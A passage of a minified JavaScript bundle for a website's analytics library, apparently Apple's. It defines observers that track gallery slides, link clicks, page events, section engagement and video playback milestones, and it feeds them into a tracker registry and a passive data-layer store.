slideId="",length=0;if(slide&&Array.isArray(slide)){length=slide.length;for(let i=0;i<length;i++)if("function"==typeof slide[i].getElement&&"function"==typeof slide[i].getElementId){const slideElement=slide[i].getElement(),customSlideId=slideElement?slideElement.getAttribute("data-analytics-gallery-item-id"):null;slideId+=customSlideId?customSlideId+"-":slide[i].getElementId()+"-"}}return slideId.slice(0,slideId.length-1)}track(d){if(!this.tracker)return;if(!1===this.options.trackAutoRotate&&(!d.interactionEvent||d.interactionEvent.gallery&&d.interactionEvent.gallery===this.gallery))return;const data=Object.assign({},d);data.interactionEvent=this.interactionEvent||this._createInteractionEvent(d),this.options.galleryName||errorHandler.log(moduleName,"track",this.options.galleryName+" is not a valid gallery name"),errorHandler.exception||(data.incoming&&"string"!=typeof data.incoming.id&&(data.incoming.id=this._getSlideId(data.incoming)),data.outgoing&&"string"!=typeof data.outgoing.id&&(data.outgoing.id=this._getSlideId(data.outgoing)),this.outgoingSlideTimestamp=this.incomingSlideTimestamp,this.incomingSlideTimestamp=Date.now(),data.incomingSlideTimestamp=this.incomingSlideTimestamp,data.outgoingSlideTimestamp=this.outgoingSlideTimestamp,this.tracker.track({type:"gallery",data:data,observer:this,options:this.options}))}destroy(){this.gallery||errorHandler.log(moduleName,"destroy",this.gallery+" is not an object"),errorHandler.exception||(this.removeListener(),this.options=null,this.tracker=null,this.gallery=null,this.trackedInteractionTypes=null,this.interactionEvent=null,observerRegistry.remove(this))}}},{"../ErrorHandler":356,"../Tracker":358,"../constants":359,"./observerRegistry":396,"@apple/analytics-data-layer":46}],392:[function(require,module,exports){const ancestor=require("@marcom/dom-traversal/ancestor"),Tracker=require("../Tracker"),errorHandler=require("../ErrorHandler"),EventEmitterMicro=require("@marcom/ac-event-emitter-micro").EventEmitterMicro,isIntraPageLink=require("../helpers/DOM").isIntraPageLink,observerRegistry=require("./observerRegistry"),defaultOptions={dataAttribute:"analytics-link",titleDataAttribute:"analytics-title",silent:!0,deferred:!0,autoEnable:!0};module.exports=class LinkAnalyticsObserver extends EventEmitterMicro{constructor(options={}){super(options),this.options={...defaultOptions,...options},this.observerType="link",observerRegistry.add(this),this.tracker=Tracker,this.isEnabled=!1,this.defaultTracking=this.track.bind(this),!0===this.options.autoEnable&&this.enable()}enable(){errorHandler.exception||this.isEnabled||(this.addListener(),this.isEnabled=!0,this.trigger("enabled"))}addListener(){document.body.addEventListener("mouseup",this.defaultTracking)}removeListener(){document.body.removeEventListener("mouseup",this.defaultTracking)}track(e){if(!this.tracker)return;const data={};let targetEl,linkAncestor;const element=e.target;"a"===element.nodeName.toLowerCase()&&(targetEl=element),targetEl||(linkAncestor=ancestor(element,"a"),linkAncestor&&(targetEl=linkAncestor)),targetEl&&!isIntraPageLink(targetEl)&&(data.targetEl=targetEl,this.tracker.track({type:"link",event:e,data:data,options:this.options}))}destroy(){this.removeListener(),this.options=null,this.tracker=null,this.isEnabled=null,this.defaultTracking=null,observerRegistry.remove(this)}}},{"../ErrorHandler":356,"../Tracker":358,"../helpers/DOM":361,"./observerRegistry":396,"@marcom/ac-event-emitter-micro":281,"@marcom/dom-traversal/ancestor":293}],393:[function(require,module,exports){const Tracker=require("../Tracker"),errorHandler=require("../ErrorHandler"),onDocumentReady=require("../helpers/onDocumentReady"),dynamicEventBinder=require("../helpers/dynamicEventBinder").dynamicEventBinder,dynamicEventBinderRemoveListeners=require("../helpers/dynamicEventBinder").removeListeners,EventEmitterMicro=require("@marcom/ac-event-emitter-micro").EventEmitterMicro,isIntraPageLink=require("../helpers/DOM").isIntraPageLink,ancestor=require("@marcom/dom-traversal/ancestor"),endOfPageTrack=require("@apple/analytics-end-of-page").endOfPage,observerRegistry=require("./observerRegistry"),defaultOptions={autoEnable:!0};module.exports=class PageAnalyticsObserver extends EventEmitterMicro{constructor(options={}){super(options),this.options={...defaultOptions,...options},this.observerType="page",observerRegistry.add(this),this.tracker=Tracker,this.initialized=!1,this.enabled=!1;this.onReadyTracking=this.track.bind(this,"readyStateComplete",{silent:!0}),this.onFocusIn=this.track.bind(this,"focusin",{}),this.onEndOfPage=this.trackEndOfPage.bind(this,"endOfPage",{}),this.onSubmit=this.track.bind(this,"submit",{deferred:!0}),this.onLinkClick=this.track.bind(this,"linkClick",{}),this.onNavigationalLink=this.onNavigationalLink.bind(this),this.onPageHide=this.track.bind(this,"pageHide",{deferred:!0,beacon:{}}),this.onScroll=this.onScroll.bind(this),!0===this.options.autoEnable&&this.enable()}onScroll(){endOfPageTrack({element:document.querySelector("#ac-globalfooter"),onPageEnd:this.onEndOfPage}),document.removeEventListener("scroll",this.onScroll)}enable(){errorHandler.exception||this.enabled||(this.tracker.AppMeasurement.initialize(this.options),this.track("page"),this.enabled=!0,this.trigger("enabled"),setTimeout((()=>{this.track("storeAtPageLoad",{deferred:!0}),onDocumentReady(this.onReadyTracking),dynamicEventBinder({parentSelector:"body",eventType:"focusin",childSelector:"input",callback:this.onFocusIn}),dynamicEventBinder({parentSelector:"body",eventType:"click",childSelector:"a",callback:this.onLinkClick}),dynamicEventBinder({parentSelector:"body",eventType:"click",childSelector:"a",callback:this.onNavigationalLink}),dynamicEventBinder({parentSelector:"body",eventType:"submit",childSelector:"form",callback:this.onSubmit}),dynamicEventBinder({parentSelector:window,eventType:"pagehide",callback:this.onPageHide})}),0),setTimeout((()=>{document.addEventListener("scroll",this.onScroll)}),1e3))}onNavigationalLink(e){if(!this.tracker)return;const data={};let targetEl,linkAncestor;const element=e.target;"a"===element.nodeName.toLowerCase()&&(targetEl=element),targetEl||(linkAncestor=ancestor(element,"a"),linkAncestor&&(targetEl=linkAncestor)),targetEl&&!isIntraPageLink(targetEl)&&(data.targetEl=targetEl,this.tracker.track({type:"navigationalLink",event:e,data:data,options:JSON.parse(JSON.stringify({deferred:!0,beacon:{}}))}))}track(type,options,e){if(!this.tracker)return;let data={};"page"===type&&this.options&&this.options.data&&(data=this.options.data),options={...this.options,...options},this.tracker.track({type:type,event:e,data:data,options:JSON.parse(JSON.stringify(options))})}trackEndOfPage(type,options,data){this.tracker&&this.tracker.track({type:type,data:{events:data.beacon.events.toString()},options:JSON.parse(JSON.stringify(options))})}destroy(){this.options=null,this.tracker=null,this.initialized=null,dynamicEventBinderRemoveListeners(),document.removeEventListener("scroll",this.onScroll),observerRegistry.remove(this)}}},{"../ErrorHandler":356,"../Tracker":358,"../helpers/DOM":361,"../helpers/dynamicEventBinder":365,"../helpers/onDocumentReady":378,"./observerRegistry":396,"@apple/analytics-end-of-page":90,"@marcom/ac-event-emitter-micro":281,"@marcom/dom-traversal/ancestor":293}],394:[function(require,module,exports){const ElementEngagement=require("@marcom/ac-element-engagement"),Tracker=require("../Tracker"),errorHandler=require("../ErrorHandler"),dataStringToObject=require("../helpers/dataStringToObject"),isNumeric=require("../helpers/isNumeric"),EventEmitterMicro=require("@marcom/ac-event-emitter-micro").EventEmitterMicro,debounce=require("@marcom/function-utils/debounce"),observerRegistry=require("./observerRegistry");ElementEngagement._elementInViewPastThreshold=function(trackedElement){let isInThreshold=!1;return isInThreshold=trackedElement.engaged?trackedElement.pixelsInView>=Math.min(this._windowHeight/3,325):trackedElement.pixelsInView>=Math.min(this._windowHeight/2.1,450),isInThreshold=isInThreshold||trackedElement.percentInView>trackedElement.inViewThreshold,isInThreshold};const defaultOptions={dataAttribute:"analytics-section-engagement",autoEnable:!0,customInitialization:!1},trackedElementDefaults={stopOnEngaged:!1,timeToEngage:1e3},debounceOptions={leading:!0};module.exports=class SectionAnalyticsObserver extends EventEmitterMicro{constructor(options={}){super(options),ElementEngagement.elements.length>0&&errorHandler.warn("SectionAnalyticsObserver","constructor","element engagement was already tracking elements when a new section observer was created. This could lead to errors in tracking. Make sure to destroy section observer before creating a new one."),this.options=Object.assign({},defaultOptions,options),this.observerType="section",observerRegistry.add(this),this.tracker=Tracker,this.elementEngagement=ElementEngagement,this.isEnabled=!1,this.sections=[],this._listeners=!1,!0===this.options.autoEnable&&this.enable()}enable(){errorHandler.exception||this.isEnabled||(this._bindMethods(),this.options.customInitialization||(this._loadSections(),this.initializeTracking()))}initializeTracking(){this.sections&&this.sections.length>0?(this._setPosition(),this.options.elements=this.sections,this._addListeners(),this.elementEngagement.start(),this.isEnabled=!0,this.trigger("enabled")):errorHandler.warn("SectionAnalyticsObserver","initializeTracking","initialization of Section Observer had no effect because no valid sections were queued before initialization.")}initializeSection(el){if(!this.sections||0===this.sections.length)return;const trackedElement=this._getTrackedElement(el);trackedElement&&(this._setPosition(),this._listeners||this._addListeners(),this.options.elements&&Array.isArray(this.options.elements)?this.options.elements.push(el):this.options.elements=[el],trackedElement.tracking=!1,this.elementEngagement.start(trackedElement))}addSection(el){if(!el||!(el instanceof window.Element)||this._getTrackedElement(el))return;let options;this.sections.push(el);const dataString=el.getAttribute("data-"+this.options.dataAttribute);options=dataStringToObject(dataString),options=this._castDataAttributeOptions(options),options=Object.assign({},trackedElementDefaults,options),this.elementEngagement.addElement(el,options)}removeSection(el){const trackedElement=this._getTrackedElement(el),index=this.sections.indexOf(el);index>-1&&this.sections.splice(index,1),this.elementEngagement.stop(trackedElement)}clearSections(){this.elementEngagement&&this.elementEngagement.elements&&this.elementEngagement.elements.forEach(function(trackedElement){this.elementEngagement.stop(trackedElement)}.bind(this)),this.sections=[]}refreshMetrics(){this.elementEngagement.refreshAllElementMetrics()}startSectionEngagement(el){const trackedElement=this._getTrackedElement(el);trackedElement&&(trackedElement.trigger("thresholdenter",trackedElement),trackedElement.trigger("engaged",trackedElement),this.elementEngagement._engaged.call(this.elementEngagement,trackedElement))}endSectionEngagement(el){const trackedElement=this._getTrackedElement(el);trackedElement&&trackedElement.tracking&&(trackedElement.thresholdExitTime=Date.now(),this.elementEngagement.stop(trackedElement),this.track({element:trackedElement}))}pauseElementTracking(el){const trackedElement=this._getTrackedElement(el);trackedElement&&(trackedElement.isActive=!1)}resumeElementTracking(el){const trackedElement=this._getTrackedElement(el);trackedElement&&(trackedElement.isActive=!0)}_bindMethods(){this._onThresholdExit=this._onThresholdExit.bind(this),this._onScroll=this._onScroll.bind(this),this._onResize=this._onResize.bind(this),this.endSectionEngagement=this.endSectionEngagement.bind(this),this._getTrackedElement=this._getTrackedElement.bind(this)}_loadSections(){[...document.querySelectorAll("[data-"+this.options.dataAttribute+"]")].forEach((function(section){this.addSection(section)}),this)}_setPosition(){let i;const totalSections=this.sections.length;for(i=0;i<totalSections;i+=1)this.sections[i].position=i+1}_castDataAttributeOptions(options){return options=Object.assign({},options),Object.keys(options).forEach((function(key){const value=options[key];let castValue;castValue="false"!==value&&("true"===value||(isNumeric(value),value)),options[key]=castValue})),options}_addListeners(){this._listeners=!0,this.elementEngagement.on("thresholdexit",this._onThresholdExit),window.addEventListener("scroll",this._onScroll),window.addEventListener("resize",this._onResize),window.addEventListener("orientationchange",this._onResize)}_removeListeners(){this._listeners=!1,this.elementEngagement&&this.elementEngagement.off&&"function"==typeof this.elementEngagement.off&&this.elementEngagement.off("thresholdexit",this._onThresholdExit),window.removeEventListener("scroll",this._onScroll),window.removeEventListener("resize",this._onResize),window.removeEventListener("orientationchange",this._onResize)}_onThresholdExit(trackedElement){if(trackedElement.engaged){const data={element:trackedElement};this.elementEngagement.stop(trackedElement),this.track(data)}}_onScroll(){return debounce((()=>{this.refreshMetrics(),this._checkForPageEnd()}),300,debounceOptions)()}_onResize(){return debounce((()=>{this._checkForPageEnd()}),300,debounceOptions)()}_checkForPageEnd(){window.pageYOffset>=document.body.scrollHeight-window.innerHeight&&this._pageEnd()}_pageEnd(){const sectionsInView=[];this.elementEngagement.elements.forEach((function(element){element.inView&&element.inThreshold&&element.tracking&&element.isActive&&sectionsInView.push(element)})),sectionsInView.forEach((function(section){section.engaged?this.endSectionEngagement(section):!1===section.has("engaged")&&section.once("engaged",this.endSectionEngagement)}),this)}track(data){this.tracker&&this.tracker.track({type:"section",data:data,options:this.options})}destroy(){this.elementEngagement&&(this.clearSections(),this.elementEngagement.stop()),this._removeListeners(),this.options=null,this.elementEngagement=null,this.tracker=null,this.sections=null,observerRegistry.remove(this)}_getTrackedElement(trackedElement){return trackedElement instanceof window.Element&&(trackedElement=this.elementEngagement.elements.filter((function(elementTracker){return elementTracker.element===trackedElement}))[0]),trackedElement instanceof EventEmitterMicro?trackedElement:null}}},{"../ErrorHandler":356,"../Tracker":358,"../helpers/dataStringToObject":364,"../helpers/isNumeric":374,"./observerRegistry":396,"@marcom/ac-element-engagement":271,"@marcom/ac-event-emitter-micro":281,"@marcom/function-utils/debounce":303}],395:[function(require,module,exports){const errorHandler=require("../ErrorHandler"),Tracker=require("../Tracker"),isNode=require("@marcom/ac-dom-nodes/isNode"),debounce=require("@marcom/function-utils/debounce"),isHandheld=require("@marcom/feature-detect/isHandheld")(),acUserAgent=require("@marcom/useragent-detect"),observerRegistry=require("./observerRegistry"),videoSegmentBoundries=[0,.1,.25,.5,.75,.9,1],defaultOptions={mediaEvents:[],mediaEventCallbacks:{},dataAttribute:"analytics-id",trackCaptions:!0,trackMilestones:!0,trackSeeking:!0,trackDuration:!0,trackCurrentTime:!0,streamingVideo:!1},IS_IE=acUserAgent.browser.ie,IS_MOBILE=acUserAgent.os.ios||acUserAgent.os.android;module.exports=class VideoAnalyticsObserver{constructor(video,options={}){video&&"object"==typeof video||errorHandler.log("VideoAnalyticsObserver",null,video+" is not an object"),this.options={...defaultOptions,...options},this.observerType="video",observerRegistry.add(this),!0===this.options.streamingVideo&&(this.options.trackMilestones=!1,this.options.trackSeeking=!1,this.options.trackDuration=!1,this.options.trackCurrentTime=!1),Array.isArray(this.options.mediaEvents)||errorHandler.log("VideoAnalyticsObserver",null,this.options.mediaEvents+" is not a valid media events array"),this.tracker=Tracker,this.video=video,this.playCount=0,this.ttShowCount=0,this._callbacks={},this._events={play:"play",playing:"playing",pause:"pause",timeupdate:"timeupdate",seeking:"seeking",seeked:"seeked",ended:"ended",texttrackshow:"texttrackshow",PlayPromiseResolved:"PlayPromiseResolved"},this._onWebkitEndFullscreen=this._onWebkitEndFullscreen.bind(this),this._onPlayingFromStart=this._onPlayFromStart.bind(this),this._getPlayEventName=this._getPlayEventName.bind(this),this._initializeInDOM()}_initializeInDOM(){errorHandler.exception||(this.options.videoElement?this.videoElement=this.options.videoElement:this._isAcVideo()&&this._setVideoElement(),(this.options.trackMilestones||this.options.trackSeeking)&&this._setupMilestoneTracking(),this.attachEvents())}_setupMilestoneTracking(){this._milestoneTrackingTimeout=null,this._hadSeeked=!1,this._hadJustEnded=!1,this._milestoneTimeoutDuration=1e3,this._allVideoMilestone=this._createVideoMilestones(),this._activeVideoMilestones=[],this._milestonesSeeked=debounce((()=>{this._hadSeeked||(this._hadJustEnded&&this._isAcVideo()?this._hadJustEnded=!1:(this._hadSeeked=!0,this._refreshMilestones(),this.videoElement&&!this.videoElement.paused&&(this._milestoneTimeoutDuration=2500,this._checkForMilestone())))}),100),this._milestonesSeekedCancel=this._milestonesSeeked.cancel,this._bindMilestoneHandlers()}_createVideoMilestones(){const milestones=[];return videoSegmentBoundries.forEach((function(item,index){index!==videoSegmentBoundries.length-1&&milestones.push([item,videoSegmentBoundries[index+1]])})),milestones}attachEvents(){const options=this.options;let mediaEventCallback;options.mediaEvents.forEach(function(mediaEvent){mediaEventCallback=options.mediaEventCallbacks[mediaEvent],mediaEventCallback="function"==typeof mediaEventCallback?mediaEventCallback:this._defaultTracking.bind(this,mediaEvent),this._callbacks[mediaEvent]=mediaEventCallback,this.addListener(mediaEvent,this._callbacks[mediaEvent])}.bind(this)),this._attachDefaultEvents()}_attachDefaultEvents(){this._prepareForPlayFromStart(),this.video.on(this._events.ended,this._onEnded,this),this.video.on(this._events.timeupdate,this._onTimeupdate,this),!0===this.options.trackCaptions&&this.video.on(this._events.texttrackshow,this._onTextTrackShow,this)}detachEvents(){this.options.mediaEvents.forEach(function(mediaEvent){this.removeListener(mediaEvent,this._callbacks[mediaEvent])}.bind(this)),this._detachPrivateEvents()}_detachPrivateEvents(){this.video.off(this._events.play,this._onPlayFromStart,this),this.video.off(this._events.PlayPromiseResolved,this._onPlayingFromStart,this),this.video.off(this._events.ended,this._onEnded,this),this.video.off(this._events.timeupdate,this._onTimeupdate,this),this.video.off(this._events.texttrackshow,this._onTextTrackShow,this)}_prepareForPlayFromStart(){this._playBound||((this.options.trackMilestones||this.options.trackSeeking)&&this._cleanUpMilestoneTracking(),IS_IE&&this._isAcVideo()&&this.ended?this.videoElement.addEventListener(this._events.playing,this._onPlayingFromStart):IS_IE?this.video.once(this._events.play,this._onPlayFromStart,this):this.video.once(this._getPlayEventName(),this._onPlayingFromStart,this),this._playBound=!0)}_onPlayFromStart(e){if(this.started)return;(this.options.trackMilestones||this.options.trackSeeking)&&(this._setVideoElement(),this.videoElement&&(IS_IE&&this._isAcVideo()&&this.ended&&this.videoElement.removeEventListener(this._events.playing,this._onPlayingFromStart),isHandheld&&!this._isAcVideo()&&this.videoElement.addEventListener("webkitendfullscreen",this._onWebkitEndFullscreen)),this._hadSeeked=!1,this._refreshMilestones(),this._startTrackingMilestones()),this._started=!0;const data=this._bundleTrackingData(this._events.play,e);data.playCount=this.playCount,this.track(data),this.playCount+=1,this._playBound=!1}_onWebkitEndFullscreen(){this._started=!1,this.videoElement&&this.videoElement.removeEventListener("webkitendfullscreen",this._prepareForPlayFromStart),this._prepareForPlayFromStart()}_onTimeupdate(e){if(e.currentTime<.1){let paused=!0;this.videoElement&&void 0!==typeof this.videoElement.paused&&(paused=this.videoElement.paused),this.playCount>0&&this._started&&paused&&(this._started=!1,this._prepareForPlayFromStart())}}_onEnded(e){(this.options.trackMilestones||this.options.trackSeeking)&&(this._milestonesSeekedCancel(),this._hadJustEnded=!0),this._started=!1;const data=this._bundleTrackingData("ended",e);this.ended=!0,this.track(data),this._prepareForPlayFromStart()}_onTextTrackShow(e){const videoEl=this.video._videoImpl.getMediaElement(),data=this._bundleTrackingData(this._events.texttrackshow,e);!videoEl.paused&&!videoEl.ended&&videoEl.currentTime>0&&(data.ttShowCount=this.ttShowCount,this.track(data),this.ttShowCount+=1)}_setVideoElement(){this.video&&(void 0!==this.video.getMediaElement&&this.video.getMediaElement()?this.videoElement=this.video.getMediaElement():this.video.videoId&&(this.videoElement=document.querySelector('[data-analytics-video-id="'+this.video.videoId+'"] video')))}_startTrackingMilestones(){this.videoElement&&(this._setMilestoneEventListeners(),this._checkForMilestone())}_bindMilestoneHandlers(){this._milestonesSeeking=this._milestonesSeeking.bind(this),this._milestonesSeeked=this._milestonesSeeked.bind(this),this._milestonesPlay=this._milestonesPlay.bind(this),this._milestonesPause=this._milestonesPause.bind(this)}_setMilestoneEventListeners(){this.videoElement.addEventListener(this._events.seeking,this._milestonesSeeking),this.videoElement.addEventListener(this._events.seeked,this._milestonesSeeked),IS_IE||IS_MOBILE?this.videoElement.addEventListener(this._events.play,this._milestonesPlay):this.videoElement.addEventListener(this._getPlayEventName(),this._milestonesPlay),this.videoElement.addEventListener(this._events.pause,this._milestonesPause)}_milestonesSeeking(){if(this._hadSeeked&&(this._hadSeeked=!1),this._milestoneTrackingTimeout){if(this._hadJustEnded&&this._isAcVideo())return;clearTimeout(this._milestoneTrackingTimeout),this._milestoneTrackingTimeout=null}}_milestonesPlay(){this._checkForMilestone()}_milestonesPause(){clearTimeout(this._milestoneTrackingTimeout),this._milestoneTrackingTimeout=null}_checkForMilestone(){this._milestoneTrackingTimeout&&clearTimeout(this._milestoneTrackingTimeout),this._milestoneTrackingTimeout=setTimeout(function(){const milestone=this._getElligibleMilestone();milestone&&this._trackMilestone(milestone),this._milestoneTimeoutDuration=1e3,this._checkForMilestone()}.bind(this),this._milestoneTimeoutDuration)}_getElligibleMilestone(){if(!this.videoElement||this.videoElement.paused||0===this.videoElement.currentTime||this.videoElement.readyState<3||0===this.videoElement.duration||this.videoElement.duration===1/0||isNaN(this.videoElement.duration))return;if(!this._activeVideoMilestones[0])return;const currentTimeAsPercentage=this.videoElement.currentTime/this.videoElement.duration;if(isNaN(currentTimeAsPercentage))return;if(this._activeVideoMilestones[0][0]>currentTimeAsPercentage)return;let matchedMilestoneIndex;const currentMilestone=this._activeVideoMilestones.filter((function(milestone,index){if(currentTimeAsPercentage>=milestone[0]&&currentTimeAsPercentage<milestone[1])return matchedMilestoneIndex=index,!0}));return currentMilestone&&currentMilestone[0]?{name:currentMilestone[0][0],index:matchedMilestoneIndex}:void 0}_trackMilestone(milestone){this._activeVideoMilestones.splice(milestone.index,1);const data=this._bundleTrackingData("milestone");data.milestone=milestone.name,this._hadSeeked&&(data.seeked=!0,this._hadSeeked=!1),this.track(data)}_cleanUpMilestoneTracking(){this._hadSeeked=!1,this._refreshMilestones(),clearTimeout(this._milestoneTrackingTimeout),this._milestoneTrackingTimeout=null,this.videoElement&&(this.videoElement.removeEventListener(this._events.seeking,this._milestonesSeeking),this.videoElement.removeEventListener(this._events.seeked,this._milestonesSeeked),IS_IE||IS_MOBILE?this.videoElement.removeEventListener(this._events.play,this._milestonesPlay):this.videoElement.removeEventListener(this._getPlayEventName(),this._milestonesPlay),this.videoElement.removeEventListener(this._events.pause,this._milestonesPause))}_refreshMilestones(){this._hadSeeked?this._activeVideoMilestones=this._allVideoMilestone.slice(0):this._activeVideoMilestones=this._allVideoMilestone.slice(1)}addListener(eventType,callback){this.video.on(eventType,callback)}removeListener(eventType,callback){this.video.off(eventType,callback)}_getCommonVideoData(eventType){const data={};data.targetEl=this.video.el||null;const videoIdFromDataAttr=data.targetEl&&isNode(data.targetEl)?data.targetEl.getAttribute("data-analytics-id"):"";return data.videoId=videoIdFromDataAttr||this.video.targetId,data.ended=this.ended,data.eventType=eventType,"playing"===data.eventType&&(data.eventType="play"),this.videoElement&&(data.duration=NaN,data.currentTime=NaN,data.src=null,isNaN(this.videoElement.duration)||(data.duration=this.videoElement.duration),isNaN(this.videoElement.currentTime)||(data.currentTime=this.videoElement.currentTime),void 0!==this.videoElement.src&&(data.src=this._getUniqueVideoId(this.videoElement.src))),this._hadSeeked&&data.currentTime&&(data.currentTime=data.currentTime-this._milestoneTimeoutDuration/(this._milestoneTimeoutDuration/2)),data}_getUniqueVideoId(videoSrc){let videoId=null;return videoId=videoSrc.match(/[\w\d]{8}[\w\d-]+[\w\d/]+\//g),videoId&&videoId.length?videoId[0]:videoSrc}_bundleTrackingData(eventType,e){const commonTrackingData=this._getCommonVideoData(eventType);return Object.assign({},e,commonTrackingData)}_defaultTracking(eventType){const data=this._bundleTrackingData(eventType);this.track(data)}_isAcVideo(){return"function"==typeof this.video.play}_getPlayEventName(){if(this.video.VERSION){return this._isVersionGreaterOrEqual(this.video.VERSION.toArray(),"3.6.1".split("."))?this._events.PlayPromiseResolved:this._events.play}return this._events.play}_isVersionGreaterOrEqual(v1,v2){return!v1.length&&!v2.length||(v1[0]>v2[0]||(parseInt(v1[0])===parseInt(v2[0])?this._isVersionGreaterOrEqual(v1.slice(1),v2.slice(1)):!(v1[0]<v2[0])&&void 0))}track(data){if(this.tracker){if("milestone"===data.eventType){if(!this.options.trackMilestones&&void 0===data.seeked)return;if(!this.options.trackSeeking&&void 0!==data.seeked)return}this.tracker.track({type:"video",data:data,options:this.options})}}destroy(){this.detachEvents(),this.options=null,this.tracker=null,this.video=null,this.playCount=null,this.ttShowCount=null,this._events=null,this._callbacks=null,observerRegistry.remove(this)}}},{"../ErrorHandler":356,"../Tracker":358,"./observerRegistry":396,"@marcom/ac-dom-nodes/isNode":267,"@marcom/feature-detect/isHandheld":300,"@marcom/function-utils/debounce":303,"@marcom/useragent-detect":308}],396:[function(require,module,exports){let idIncrementor=0;module.exports=new class observerRegistry{constructor(){this.observers={}}destroy(){const obs=this.observers;Object.keys(this.observers).forEach((observerGroup=>{obs[observerGroup]&&obs[observerGroup].forEach((observer=>{observer.destroy&&observer.destroy()}))})),idIncrementor=0}add(observer){this.observers[observer.observerType]||(this.observers[observer.observerType]=[]),observer.observerId=idIncrementor,idIncrementor++,this.observers[observer.observerType].push(observer)}remove(observer){this.observers[observer.observerType]&&(this.observers[observer.observerType]=this.observers[observer.observerType].filter((obs=>{if(obs.observerId!==observer.observerId)return!0})),this.observers[observer.observerType].length||delete this.observers[observer.observerType])}}},{}],397:[function(require,module,exports){const errorHandler=require("./ErrorHandler"),passiveTrackerPath=require("./constants").dataLayer.paths.passiveTracker,templateVarHelper=require("./helpers/templateVar"),get=require("@apple/analytics-data-layer").get,set=require("@apple/analytics-data-layer").set;function storeData(value){"object"==typeof value&&(value=JSON.stringify(value)),set(passiveTrackerPath,value)}module.exports=function track(data,options){if(options=options||{},!data||"object"!=typeof data||Array.isArray(data))return void errorHandler.warn("PassiveTracker","track","data must be a valid object");options.priority=options.priority||50,options.trackOnPageLoad=!0===options.trackOnPageLoad,options.trackOnExitLink=!0===options.trackOnExitLink,data.options={},options.overwriteAppMeasurementValues&&(data.options.overwriteAppMeasurementValues=!0),!1===options.overwriteAppMeasurementEvents&&(data.options.overwriteAppMeasurementEvents=!1),options.trackOnPageLoad&&(data.options.trackOnPageLoad=!0),options.trackOnExitLink&&(data.options.trackOnExitLink=!0),data.options.priority=options.priority;let dataStr=JSON.stringify(data);dataStr?(dataStr=templateVarHelper.translate(dataStr,templateVarHelper.set()),function storeTrackingData(data,options){const existingData=function getExistingData(options){if(options.overwriteStorageItem)return null;let existingData=get(passiveTrackerPath);if(!existingData)return;if(existingData=JSON.parse(existingData),"object"!=typeof existingData)return null;return existingData}(options);if(!existingData)return void storeData([data]);const mergedData=function createMergedData(newData,existingData){return existingData.push(newData),existingData}(data,existingData);mergedData&&storeData(mergedData)}(JSON.parse(dataStr),options)):errorHandler.warn("PassiveTracker","track","data was invalid because it could not be stringified")}},{"./ErrorHandler":356,"./constants":359,"./helpers/templateVar":383,"@apple/analytics-data-layer":46}],398:[function(require,module,exports){module.exports=new class TrackerRegistry{constructor(){this.registry={}}addEntry(type,name,order,track){this.registry[name]={type:type,name:name,order:order,track:track}}processBeaconByType(type,data){const filteredTrackers=Object.values(this.registry).filter((tracker=>tracker.type===type));filteredTrackers.sort(((a,b)=>a.order-b.order)),filteredTrackers.forEach((tracker=>{tracker.track(data)}))}registerAllTrackers(){[require("./pageHide"),require("./endOfPage"),require("./pageLoad"),require("./storeDeferredBeaconAtPageLoad"),require("./customPageLoad"),require("./deferredToPageLoad"),require("./sectionEngagement"),require("./click"),require("./link"),require("./navigationalLink"),require("./gallery"),require("./video"),require("./event"),require("./elementEngagement"),require("./performance"),require("./search/begin"),require("./search/perform")].forEach((tracker=>{tracker.initialize()}))}}},{"./click":399,"./customPageLoad":400,"./deferredToPageLoad":401,"./elementEngagement":402,"./endOfPage":403,"./event":404,"./gallery":405,"./link":406,"./navigationalLink":407,"./pageHide":408,"./pageLoad":409,"./performance":410,"./search/begin":413,"./search/perform":414,"./sectionEngagement":415,"./storeDeferredBeaconAtPageLoad":416,"./video":417}],399:[function(require,module,exports){const registry=require("./TrackerRegistry"),regions=require("./regions/regions"),parseFromDataAttribute=require("../helpers/parseFromDataAttribute"),get=require("@apple/analytics-data-layer").get,setOptions=require("../helpers/setOptions"),separator=require("../helpers/separator"),formatter=require("../helpers/formatter"),dataLayerConfig=require("../constants").dataLayer.configuration,confKey=dataLayerConfig.key,confKeys=dataLayerConfig.keys;function track(trackingData){const data=function generateSourceData(trackingData){const data={};let title;const linkTitleAttribute=trackingData.data.targetEl.getAttribute("data-"+trackingData.options.titleDataAttribute);title=linkTitleAttribute||(trackingData.data.targetEl.textContent?trackingData.data.targetEl.textContent.trim():trackingData.data.targetEl.innerText?trackingData.data.targetEl.innerText.trim():"no title available");return title=title.toLowerCase(),data.title=title,data.formattedTitle=get([confKey,confKeys.pageName])+separator.hyphen+title,data.regionAncestry=regions.getRegionAncestryByElement(trackingData.data.targetEl),data.regionAncestry=formatter.getRegionAncestry(data),data}(trackingData);return trackingData.beacon.title=data.formattedTitle,trackingData.beacon.prop3=data.formattedTitle,trackingData.beacon.eVar1=get([confKey,confKeys.computedPageName])+separator.pipe+data.regionAncestry+data.title,function _setCustomTrackingProps(trackingData){const dataAttrValue=trackingData.data.targetEl.getAttribute("data-"+trackingData.options.dataAttribute),customProperties=dataAttrValue?parseFromDataAttribute(dataAttrValue,trackingData.data.targetEl):"";if(!customProperties&&"object"!=typeof customProperties)return;for(const key in customProperties)"usePassiveTracker"===key?"true"===customProperties[key]&&(trackingData.options.usePassiveTracker=!0):"useBeacon"===key?"true"===customProperties[key]&&(trackingData.options.useBeacon=!0):trackingData.beacon[key]=customProperties[key]}(trackingData),trackingData.options.async=setOptions.async(trackingData.data),trackingData}module.exports={initialize:function initialize(){registry.addEntry("click","clickTracker",50,track)},track:track}},{"../constants":359,"../helpers/formatter":368,"../helpers/parseFromDataAttribute":379,"../helpers/separator":380,"../helpers/setOptions":381,"./TrackerRegistry":398,"./regions/regions":412,"@apple/analytics-data-layer":46}],400:[function(require,module,exports){const registry=require("./TrackerRegistry"),get=require("@apple/analytics-data-layer").get,errorHandler=require("../ErrorHandler"),moduleName="customPageLoad",dataLayerKeys=require("../constants").dataLayer,confKey=dataLayerKeys.configuration.key,confKeys=dataLayerKeys.configuration.keys;function track(trackingData){let pageData=get([confKey,confKeys.pageTrackingData]);if(!pageData)return trackingData;try{pageData=JSON.parse(pageData)}catch(e){errorHandler.warn(moduleName,"_setCustomProps","JSON.parse had an error with the input of: \n\n"+pageData+"\n\nIs it in proper JSON format? \n\nOriginal error:\n"+e)}if(!pageData||"object"!=typeof pageData||Array.isArray(pageData))return trackingData;for(const prop in pageData)pageData.hasOwnProperty(prop)&&(trackingData.beacon[prop]=pageData[prop]);return trackingData}module.exports={initialize:function 